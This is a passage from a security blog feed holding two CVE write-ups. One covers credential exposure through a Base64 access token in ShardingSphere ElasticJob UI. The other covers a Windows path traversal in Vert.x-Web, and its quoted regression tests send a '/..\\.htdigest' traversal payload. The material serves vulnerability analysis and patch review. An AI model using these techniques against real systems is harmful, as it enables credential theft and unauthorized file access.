&lt;p&gt;After that It provides a method to check user authentication by comparing the provided username and password with the pre-configured root and guest usernames and passwords. Finally, We can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; method that encodes the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; object as a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt; encoded string which is returned as the authentication token (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt;) and here comes the vulnerability with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; method is returning the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt; string with representation of the entire &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; object including the root username and password. As a results it’s exposed as we saw in the first of the analysis.&lt;/p&gt;

&lt;h1 id=&quot;dynamic-analysis&quot;&gt;&lt;strong&gt;Dynamic Analysis&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, Let’s Setup our lab in debugging mode to see how it works dynamically. As we pulled the image before we will just run it again with a different name and port.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo docker run -d --name elasticjob-ui-debug -p 8888:8088 -p 8000:8000 -e ELASTIC_JOB_GUEST_ENABLED=true -e JAVA_TOOL_OPTIONS=&quot;-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n&quot; apache/shardingsphere-elasticjob-lite-ui:3.0.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here we added a new port mapping which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8000&lt;/code&gt; for debugging and also added new environment variable to set debugging options &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JAVA_TOOL_OPTIONS=&quot;-agentlib:jdwp=transport=dt_socket,address=8000,server=y,suspend=n&quot;&lt;/code&gt; &amp;amp; Finally, a port mapping for the web interface of the application &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8888&lt;/code&gt; to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8088&lt;/code&gt;. Now, It’s time to setup our debugger through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IntelliJ&lt;/code&gt; IDE, We need to download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ShardingSphere&lt;/code&gt; version &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3.0.0&lt;/code&gt; source code from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;github&lt;/code&gt; and open it as a new project inside &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IntelliJ&lt;/code&gt; IDE.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/7e13324ba73ecf47d39c4a5f01548f73&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that go to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Run&lt;/code&gt; Tab and then click on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Edit Configurations&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3563640afdd0e1fbdd8907de86946d1f&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then Click on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;+&lt;/code&gt; add sign and choose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Remote JVM Debug&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/1f0d7c3b222a7cdf4f888dbda905f7c9&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And Name it as you want &amp;amp; configure the remote debugger, By adding the machine docker &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IP&lt;/code&gt;, Debugging port which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8000&lt;/code&gt; and the module to debug which is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ShardingSphere-ElasticJob-lite-UI&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/d86a406b4e3fe943abac1c22debf5457&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally, Let’s set our breakpoint on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handlelogin&lt;/code&gt; function under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;org.apache.shardingsphere.elasticjob.lite.ui.security.AuthenticationFilter&lt;/code&gt; class:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/916c67c993120a8d86663ddfa5696c06&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, Press on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;debug&lt;/code&gt; button:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/a3cf38fc15ab5fdfb875c7bbff7b4422&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see it’s telling us that’s connected successfully to the targeted VM debug:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/913cd6fde00551ad59a0550abe2b753b&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s visit the application on our browser and login. Once we hit the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Login&lt;/code&gt; button, We will be able to see that it’s hit the breakpoint and our debugger is working:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ea5ccb61520a1ebf6c1e6daff87e1c3c&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here under &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;this&lt;/code&gt; in the debugger which refers within the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticationFilter&lt;/code&gt; class that it has the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; Object which is made out of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; class itself:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/1e51bd8bc7d6eec2d4e2e16ba8220ded&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can see that it’s already carry the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt; &amp;amp; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; names and passwords, Along with the created Objects of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Base64&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gson&lt;/code&gt;. Now, Let’s step over and set a breakpoint to line where &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;accessToken&lt;/code&gt; get added to the request:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/3ab1f16b07b71892be55f4deaed0e679&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the above screenshot as we see, By stepping over until we arrive to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;checkUser()&lt;/code&gt; function which is taking the credentials entered by user.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/250ce77c60110bb7fc050d81609a8007&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;By stepping over 2 more steps we can see that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authenticationResult&lt;/code&gt; started to created &amp;amp; Mentioned under it the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;username&lt;/code&gt;,&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password&lt;/code&gt; which are our credentials, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;success&lt;/code&gt; which is the authentication status and in this situation it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;true&lt;/code&gt; as credentials matched &amp;amp; Finally, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isGuest&lt;/code&gt; which indicates if the user is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt; or no and in our case yes it’s.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/89b326f135d1a55bac8c568b9fd37aaf&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;here we can see the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;result&lt;/code&gt; which is a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HashMap&lt;/code&gt; and will be sent with the response body. Clearly it’s generated the token and if we take this value &amp;amp; decode it we will be able to see the exposure of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; username and password, along with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest&lt;/code&gt; username and password that loaded at first of the debugging in a refer with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; class object. If we do the same with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; account we obtained from the token which is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;:&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; &amp;amp; see how it will be remain the same and will return the both users accounts in the token as we can see in the below screenshot:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/ee22d05822057eb444ffec3fd8b7b123&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;patch-diffing&quot;&gt;&lt;strong&gt;Patch Diffing&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;Now, Coming to the patches that applied on the code, It’s a lot of modifications but, we will focus on the modifications made for the classes.&lt;/p&gt;

&lt;h3 id=&quot;userauthenticationservicejava&quot;&gt;UserAuthenticationService.java&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/f937e90e006c85f26976e4d90b38c8bd&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The vulnerability in the original code block is that the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; method of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; class returns a token that contains the root username and password in plaintext which used in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doFilter()&lt;/code&gt; method to authenticate the user, which allows an attacker to extract the root username and password by intercepting and decoding the token and the patched code block fixes the vulnerability by changing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; method to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isValidToken()&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; methods which check if the token is valid and return a new token that does not contain the root username and password. Additionally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleLogin()&lt;/code&gt; method in the patched code block now checks if the user is authenticated using a valid token instead of using the vulnerable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; method. If the token is valid, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filterChain.doFilter()&lt;/code&gt; method is called to allow the user to access the requested resource. Otherwise, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;respondWithUnauthorized()&lt;/code&gt; method is called to deny access to the user.&lt;/p&gt;

&lt;h3 id=&quot;userauthenticationfilterjava&quot;&gt;UserAuthenticationFilter.java&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/441c1fb480bec8a81f61a1b7717f4f87&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The changes made to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticationFilter&lt;/code&gt; class prevent the vulnerability by implementing token based authentication instead of using a hardcoded username and password. Specifically, Adding the ability to generate a token based on a user’s credentials using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;getToken()&lt;/code&gt; method in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; class. This token is generated using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;com.auth0.jwt&lt;/code&gt; library and is signed using a randomly generated &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HMAC256&lt;/code&gt; algorithm and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isValidToken()&lt;/code&gt; method to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAuthenticationService&lt;/code&gt; class to check if the provided token is valid or not, Also Modified the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleLogin&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doFilter&lt;/code&gt; methods. Additionally, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AuthenticationFilter&lt;/code&gt; class is modified to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ObjectMapper&lt;/code&gt; instead of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Gson&lt;/code&gt; for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JSON&lt;/code&gt; serialization and deserialization. In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleLogin()&lt;/code&gt; method the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gson.fromJson()&lt;/code&gt; call is replaced with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;objectMapper.readValue()&lt;/code&gt; to deserialize the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UserAccount&lt;/code&gt; object. Finally, in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doFilter()&lt;/code&gt; method, the if statement that checks for the access token is modified to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;isValidToken()&lt;/code&gt; method instead of checking for equality with the token obtained from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;userAuthenticationService.getToken()&lt;/code&gt;.&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/dba3c2e2ae5646706285e61a610166a4&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the end, We saw how the vulnerability occured and why, By showing the wrong implementation of authentication process and showed how it’s fixed in the patch applied to the code by using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JWT&lt;/code&gt; Library to generate the token with a secret key to which keeps the confidntiality of the data. As a results it’s not exposing the credentials anymore.&lt;/p&gt;

&lt;h2 id=&quot;resources&quot;&gt;&lt;strong&gt;Resources&lt;/strong&gt;&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/apache/shardingsphere-elasticjob-ui/commit/f3afe51221cd2382e59afc4b9544c6c8a4448a99?diff=split&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://hub.docker.com/layers/apache/shardingsphere-elasticjob-lite-ui/3.0.0-beta/images/sha256-9e5f309485b252a397f3cf91177be810e0f170349416de377c7393876d1069e2?context=explore&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-22733&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;https://github.com/apache/shardingsphere-elasticjob-ui/releases/tag/3.0.0&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;</content><author><name>Zeyad Azima</name></author><summary type="html">Introduction</summary></entry><entry><title type="html">CVE-2023-24815: Vert.x-Web Path Traversal Escape</title><link href="http://localhost:5000/security%20research/CVE_2023_24815/" rel="alternate" type="text/html" title="CVE-2023-24815: Vert.x-Web Path Traversal Escape" /><published>2023-04-12T00:00:00+08:00</published><updated>2023-04-12T00:00:00+08:00</updated><id>http://localhost:5000/security%20research/CVE_2023_24815</id><content type="html" xml:base="http://localhost:5000/security%20research/CVE_2023_24815/">&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;A vulnerability discovered in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Vert.x-Web&lt;/code&gt; known as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2023-24815&lt;/code&gt;, a threat actor can exploit this vulnerability to escape the path filter leading to exfiltrate any class path resource or Path Traversal, When tunning on windows.&lt;/p&gt;

&lt;h1 id=&quot;cve-information&quot;&gt;CVE Information&lt;/h1&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-ID&lt;/code&gt;: CVE-2023-24815&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NVD Published Date&lt;/code&gt;:  02/09/2023&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NVD Last Modified&lt;/code&gt;:  02/17/2023&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVSS 3.x&lt;/code&gt;: 5.3 MEDIUM&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CWE-ID&lt;/code&gt;: Improper Limitation of a Pathname to a Restricted Directory (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Path Traversal&lt;/code&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;testing-lab&quot;&gt;Testing Lab&lt;/h1&gt;
&lt;p&gt;We would need an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IDE&lt;/code&gt; in trhis case i am using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;IntelliJ&lt;/code&gt; and we would need any version of the Vert.x-Web before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4.3.8&lt;/code&gt;. You can download the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JAR&lt;/code&gt; library for it from &lt;a href=&quot;https://jar-download.com/artifacts/io.vertx/vertx-web&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h1 id=&quot;what-is-vertx-web-&quot;&gt;What is Vert.x-Web ?&lt;/h1&gt;
&lt;p&gt;Vert.x-Web is a toolkit for building web applications and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APIs&lt;/code&gt; using the Vert.x framework which is a polyglot, reactive, and high performance application platform for the Java Virtual Machine (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JVM&lt;/code&gt;). It allows developers to write applications by providing  a set of building blocks for creating it which include routing, authentication, authorization, templating, and serving static files. With its modular and lightweight design, Vert.x-Web enables developers to build scalable, high-performance web applications and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APIs&lt;/code&gt; quickly and efficiently. Features of Vert.x-Web include:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Flexible routing&lt;/code&gt;: Define and match routes based on request methods, paths, headers, and more. You can also add request handlers, failure handlers, and response handlers to routes.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Authentication and authorization&lt;/code&gt;: Support for a variety of authentication and authorization mechanisms, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;OAuth2&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;JWT&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Basic&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Digest&lt;/code&gt; authentication.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Static file handling&lt;/code&gt;: Serve static files from the file system or classpath resources.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WebSockets and Server-Sent Events&lt;/code&gt;: Support for real-time communication between clients and the server using WebSockets and Server-Sent Events.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CORS and CSRF&lt;/code&gt;: Built-in support for Cross-Origin Resource Sharing (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CORS&lt;/code&gt;) and Cross-Site Request Forgery (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CSRF&lt;/code&gt;) protection.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Templating engines&lt;/code&gt;: Support for multiple templating engines, such as Handlebars, Jade, and Thymeleaf.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;the-analaysis&quot;&gt;The Analaysis&lt;/h1&gt;
&lt;p&gt;The vulnerability in Vert.x-Web applications running on Windows operating systems when using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StaticHandler&lt;/code&gt; with a wildcard mount point (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;) is caused by insufficient input validation and improper handling of backslashes in user input, When request is made to the application with a crafted path the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Utils.java&lt;/code&gt; code computes the relative path to locate the resource using the wildcard mount point, Here is example for the code:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;import io.vertx.core.Vertx;
import io.vertx.ext.web.Router;
import io.vertx.ext.web.handler.StaticHandler;

public class Main {

  public static void main(String[] args) {
    Vertx vertx = Vertx.vertx();
    Router router = Router.router(vertx);

    // Configure the StaticHandler with a wildcard mount point
    router.route(&quot;/*&quot;).handler(StaticHandler.create());

    vertx.createHttpServer().requestHandler(router).listen(8080);
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This will setup up a simple &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; server and configure it to handle incoming requests using the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Router&lt;/code&gt; and start listening on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8080&lt;/code&gt;. 
Now, Let’s take a look at the vulnerable code to analyze it and understand how the app handle the path. Here is the path for the class (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vertx-web/src/main/java/io/vertx/ext/web/impl/Utils.java&lt;/code&gt;). The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Utils.java&lt;/code&gt; Class contains a lot of function and the class contains various utility methods used internally by Vert.x-Web for handling requests, responses, and other web-related tasks and some of the utility methods in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Utils.java&lt;/code&gt; class include:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Parsing and normalizing paths&lt;/code&gt;: The class has methods for normalizing paths and removing redundant path elements (e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;../&lt;/code&gt;).&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handling MIME types&lt;/code&gt;: There are methods for getting MIME types based on file extensions and determining the most suitable content type based on the “Accept” header in HTTP requests.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Handling URL encoding and decoding&lt;/code&gt;: Utility methods for URL encoding and decoding of strings.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Parsing and handling cookies&lt;/code&gt;: Methods for parsing cookies from request headers and creating Set-Cookie headers for responses.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, when we scroll down through the class we can see the following method &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathOffset&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public static String pathOffset(String path, RoutingContext context) {
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;First is the define of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pathOffset&lt;/code&gt;  method and it  takes a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;String&lt;/code&gt; representing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path&lt;/code&gt; and a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RoutingContext&lt;/code&gt; as arguments.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;final Route route = context.currentRoute();
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here it’s getting the current &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Route&lt;/code&gt; from the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RoutingContext&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if (route == null) {
  return path;
} if (!route.isExactPath()) {
  final String rest = context.pathParam(&quot;*&quot;);
  if (rest != null) {
		if (rest.length() &amp;gt; 0) {
		  if (rest.charAt(0) == '/') {
			return rest;
		  } else {
			return &quot;/&quot; + rest;
		  }
		} else {
		  return &quot;/&quot;;
		}
	  }
	}  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In this condition If there’s no current route will return the original path, If not null it will check if the current route is not an exact path match, if yes Retrieve the wildcard path parameter (denoted by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;) and then check if the wildcard path parameter exists. If the wildcard path parameter exists it will normalize the wildcard path parameter by ensuring it starts with a forward slash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;) and return it. If the parameter is empty it return a single forward slash. And here where is the problem occures.&lt;/p&gt;

&lt;h1 id=&quot;patch-diffing&quot;&gt;Patch Diffing&lt;/h1&gt;
&lt;p&gt;The patch for this vulnerability done as the following(We can find the commit &lt;a href=&quot;https://github.com/vert-x3/vertx-web/commit/9e3a783b1d1a731055e9049078b1b1494ece9c15&quot;&gt;here&lt;/a&gt;):
First it’s  added the following lines to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Utils.java&lt;/code&gt; class:
&lt;img src=&quot;/assets/images/23d5d09db649988d9cb5d444798c3c7c.png&quot; alt=&quot;23d5d09db649988d9cb5d444798c3c7c.png&quot; /&gt;
And the doal of adding this lines is to remove the backslashes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; with the forwardslashes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;. Second they added new class called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StaticHandlerWindowsTest&lt;/code&gt; and te purpose of this class is to test the behavior of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StaticHandler&lt;/code&gt; class on Windows operating systems. This is done by testing the ability of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;StaticHandler&lt;/code&gt; class to prevent path traversal attacks by attempting to escape to the classpath from different types of routes. Class Code:&lt;/p&gt;
&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;package io.vertx.ext.web.handler;

import io.vertx.core.http.HttpMethod;
import io.vertx.ext.web.WebTestBase;
import org.junit.Test;

public class StaticHandlerWindowsTest extends WebTestBase {

  @Test
  public void testEscapeToClasspathFromWildcard() throws Exception {
    router.clear();
    router.route(&quot;/*&quot;).handler(StaticHandler.create(&quot;www&quot;));
    // attempt to escape to classpath, given that the handler is mounted on a wildcard,
    // reading the wildcard must return a sanitized path and therefore not allow to escape.
    testRequest(HttpMethod.GET, &quot;/..\\.htdigest&quot;, 404, &quot;Not Found&quot;);
  }

  @Test
  public void testEscapeToClasspathFromNull() throws Exception {
    router.clear();
    router.route().handler(StaticHandler.create(&quot;www&quot;));
    // attempt to escape to classpath, given that the handler is mounted on a catch all path
    testRequest(HttpMethod.GET, &quot;/..\\.htdigest&quot;, 404, &quot;Not Found&quot;);
  }

  @Test
  public void testEscapeToClasspathFromRegEx() throws Exception {
    router.clear();
